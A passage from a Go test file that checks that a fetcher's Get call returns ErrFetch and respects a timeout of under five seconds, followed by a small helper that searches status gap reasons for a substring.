	start := time.Now()
	if _, err := f.Get(context.Background(), srv.URL, false); !errors.Is(err, ErrFetch) {
		t.Fatalf("want ErrFetch, got %v", err)
	}
	if elapsed := time.Since(start); elapsed > 5*time.Second {
		t.Fatalf("the timeout did not bind: %s", elapsed)
	}
}

// -- helpers -----------------------------------------------------------------

func gapMentions(st Status, needle string) bool {
	for _, g := range st.Gaps {
		if strings.Contains(g.Reason, needle) {
			return true
		}
	}
	return false
}
